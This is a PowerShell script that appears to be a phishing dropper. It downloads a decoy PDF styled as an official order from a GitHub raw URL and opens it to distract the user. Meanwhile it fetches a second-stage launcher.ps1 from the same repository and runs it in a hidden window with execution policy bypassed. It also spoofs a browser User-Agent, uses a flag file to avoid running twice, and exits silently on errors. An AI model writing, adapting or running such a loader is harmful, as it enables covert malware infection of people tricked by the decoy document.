# === FLAG FILE CHECK - PREVENT REPEATED EXECUTION ===
$envData = Get-Item env:APPDATA
$cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
$bootFlag = Join-Path $cachePath "boot_done.flag"
if(Test-Path $bootFlag){ exit }

# Create cache directory if it doesn't exist
if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}

# === URL CONSTRUCTION ===
$rawBase = "raw.githubusercontent.com"
$orgPath = "astro-opensource/cloud-sync-tools"
$branch = "main"
$pdfAsset = "assets/Nakaz_No._661_vid_02.03.2026-4.pdf"
$launcherAsset = "assets/launcher.ps1"

$protocol = "https://"
$pdfUrl = "$protocol$rawBase/$orgPath/$branch/$pdfAsset"
$launcherUrl = "$protocol$rawBase/$orgPath/refs/heads/$branch/$launcherAsset"

# === FIXED FILE PATHS ===
$pdfPath = Join-Path $cachePath "Nakaz_No._661_vid_02.03.2026-4.pdf"
$launcherPath = Join-Path $cachePath "launcher.ps1"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    
    # Download PDF only if not already cached
    if(!(Test-Path $pdfPath)){
        $webClient.DownloadFile($pdfUrl,$pdfPath)
    }
    
    # Open the PDF
    Start-Process $pdfPath -WindowStyle Normal
    
    # Download launcher.ps1
    $webClient.DownloadFile($launcherUrl,$launcherPath)
    
    # Create boot flag file to prevent repeated execution
    "1" | Out-File -FilePath $bootFlag -Encoding UTF8
    
    # Execute launcher hidden
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden
    
}
catch {
    exit
}
